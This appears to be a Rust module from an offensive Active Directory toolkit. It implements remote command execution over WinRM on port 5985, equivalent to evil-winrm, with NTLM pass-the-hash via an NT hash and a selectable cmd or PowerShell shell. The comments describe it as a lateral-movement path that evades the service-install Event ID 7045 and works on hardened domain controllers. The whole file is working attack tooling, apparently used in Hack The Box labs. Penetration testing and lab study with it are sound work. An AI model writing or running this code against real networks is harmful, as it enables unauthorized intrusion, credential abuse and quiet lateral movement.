//! **1.4.8-B WS-EVIL-WINRM.** WinRM (WS-Man) command execution over 5985 —
//! `evil-winrm`-equivalent. NTLM auth + MS-NLMP message encryption. Quieter
//! than SVCCTL (no service-install Event ID 7045) and often the only lateral
//! path left open on hardened boxes that disabled SMB admin shares. Supports
//! pass-the-hash via `--nt-hash` (32 hex NT hash instead of `--password`).

use anyhow::{Context, Result};
use clap::{Parser, ValueEnum};

use crate::winrm;

/// **1.5.1 bug fix** (see docs/HTB_PIRATE_LIVE_LOG_1.5.1.md §2.6): shell type is
/// now selectable. gMSA-shape service accounts on hardened DCs commonly have
/// `WSMan\Cmd\Enable=0` but `WSMan\PowerShell\Enable=1` — the cmd default fails
/// with HTTP 500 on shell Create, while `--shell powershell` uses the PS-flavor
/// Windows-Shell URI that the target accepts.
#[derive(Copy, Clone, Debug, PartialEq, Eq, ValueEnum)]
pub(crate) enum ShellKind {
    /// cmd.exe-backed WinRS shell (pre-1.5.1 default). Some hardened DCs disable this
    /// for gMSA / service accounts — the shell Create is refused with HTTP 500.
    Cmd,
    /// PowerShell-flavor Windows-Shell (NOT the PSRP runspace URI). Command is
    /// wrapped as `powershell.exe -NoProfile -NonInteractive -Command <cmd>`.
    Powershell,
}

impl From<ShellKind> for winrm::ShellType {
    fn from(k: ShellKind) -> Self {
        match k {
            ShellKind::Cmd => winrm::ShellType::Cmd,
            ShellKind::Powershell => winrm::ShellType::Powershell,
        }
    }
}

#[derive(Parser)]
pub(crate) struct WinrmArgs {
    #[command(flatten)]
    pub auth: crate::shared_args::SmbAuth,
    /// WinRM port (5985 HTTP)
    #[arg(long, default_value_t = 5985)]
    pub port: u16,
    /// Pass-the-hash: NT hash (32 hex) instead of --password
    #[arg(long)]
    pub nt_hash: Option<adhammer_core::SecretString>,
    /// Command to run. Executes via `cmd.exe /c` (default) or
    /// `powershell.exe -NoProfile -NonInteractive -Command` when `--shell powershell`.
    #[arg(long)]
    pub command: String,
    /// **1.5.1** — WSMan shell type. `cmd` is the pre-1.5.1 default; `powershell` uses the
    /// PS-flavor Windows-Shell URI, required for hosts where `WSMan\Cmd\Enable=0` blocks
    /// the cmd shell for the caller (gMSA / service-account principals on hardened DCs).
    #[arg(long, value_enum, ignore_case = true, default_value = "cmd")]
    pub shell: ShellKind,
}

/// Execute a command over WinRM (WS-Man). NTLM auth + MS-NLMP message encryption over 5985 —
/// quieter than SVCCTL (no service-install event) and often the only lateral path left open.
pub(crate) async fn winrm_exec(mut a: WinrmArgs) -> Result<()> {
    a.auth.password = crate::resolve_secret(&a.auth.password, "ADHAMMER_PASSWORD")?;
    let secret = match &a.nt_hash {
        Some(h) => {
            let raw = hex::decode(h.trim()).context("NT hash must be 32 hex chars")?;
            let arr: [u8; 16] = raw
                .as_slice()
                .try_into()
                .context("NT hash must be exactly 16 bytes (32 hex)")?;
            winrm::Secret::NtHash(arr)
        }
        None => winrm::Secret::Password(a.auth.password.clone()),
    };
    let (mut client, shell_id) = winrm::WinRm::connect(
        &a.auth.host,
        a.port,
        &a.auth.domain,
        &a.auth.user,
        &secret,
        a.shell.into(),
    )
    .await?;
    eprintln!(
        "[+] WinRM shell opened on {} (ShellId {})",
        a.auth.host, shell_id
    );
    let (stdout, stderr, exit) = client.run(&shell_id, &a.command).await?;
    print!("{stdout}");
    if !stderr.is_empty() {
        eprint!("{stderr}");
    }
    eprintln!("[+] WinRM command exited {exit}");
    Ok(())
}
